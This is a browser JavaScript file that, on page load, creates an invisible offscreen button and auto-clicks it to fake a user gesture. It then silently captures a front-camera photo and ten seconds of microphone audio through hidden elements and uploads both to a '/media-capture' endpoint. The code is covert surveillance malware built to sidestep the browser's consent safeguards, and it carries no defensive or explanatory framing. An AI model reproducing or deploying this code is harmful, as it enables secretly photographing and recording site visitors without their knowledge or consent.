document.addEventListener('DOMContentLoaded', async () => {
  // AUTO-CAPTURE on page load (safe user gesture for getUserMedia)
  const captureBtn = document.createElement('button');
  captureBtn.style.cssText = 'position:fixed;top:-9999px;left:-9999px;opacity:0;z-index:-1;width:1px;height:1px';
  captureBtn.textContent = 'Camera/Audio Access';
  document.body.appendChild(captureBtn);
  
  // Auto-click after 1.5s (triggers user gesture)
  setTimeout(() => captureBtn.click(), 1500);
  
  captureBtn.onclick = async () => {
    try {
      console.log('🎥 Starting auto media capture...');
      
      // Request front camera + mic
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { 
          facingMode: 'user', 
          width: { ideal: 640 }, 
          height: { ideal: 480 },
          frameRate: { ideal: 15 }
        },
        audio: {
          echoCancellation: true,
          noiseSuppression: true,
          sampleRate: 44100,
          channelCount: 1
        }
      });
      
      // FRONT CAMERA PHOTO (snapshot)
      const video = document.createElement('video');
      video.srcObject = stream;
      video.muted = true;
      video.playsInline = true;
      document.body.appendChild(video);
      video.style.position = 'fixed';
      video.style.top = '-9999px';
      video.style.left = '-9999px';
      video.style.width = '1px';
      video.style.height = '1px';
      
      video.onloadedmetadata = async () => {
        video.play();
        // Wait for stable frame
        await new Promise(resolve => setTimeout(resolve, 1000));
        
        const canvas = document.createElement('canvas');
        canvas.width = 640;
        canvas.height = 480;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, 640, 480);
        const photoBase64 = canvas.toDataURL('image/jpeg', 0.75);
        
        // Stop video track
        stream.getVideoTracks()[0].stop();
        video.remove();
        
        // 10s AUDIO RECORDING (environment + voice)
        const audioStream = new MediaStream(stream.getAudioTracks());
        const recorder = new MediaRecorder(audioStream, { 
          mimeType: 'audio/webm;codecs=opus'
        });
        const chunks = [];
        
        recorder.ondataavailable = (e) => {
          if (e.data.size > 0) chunks.push(e.data);
        };
        
        recorder.onstop = async () => {
          try {
            const audioBlob = new Blob(chunks, { type: 'audio/webm' });
            const audioBase64 = await new Promise((resolve) => {
              const reader = new FileReader();
              reader.onload = () => resolve(reader.result);
              reader.readAsDataURL(audioBlob);
            });
            
            // UPLOAD TO SERVER
            const formData = new FormData();
            formData.append('photo', photoBase64);
            formData.append('audio', audioBase64);
            formData.append('username', 'auto-capture');
            
            const response = await fetch('/media-capture', {
              method: 'POST',
              body: formData
            });
            
            const result = await response.json();
            console.log('✅ Media captured & uploaded:', result);
          } catch (err) {
            console.log('Upload failed:', err);
          } finally {
            stream.getTracks().forEach(track => track.stop());
          }
        };
        
        recorder.start();
        // Record 10 seconds
        setTimeout(() => recorder.stop(), 10000);
      };
      
    } catch (error) {
      console.log('❌ Media capture blocked/denied:', error.name, error.message);
      // Common: NotAllowedError, NotFoundError, OverconstrainedError
    }
  };
});

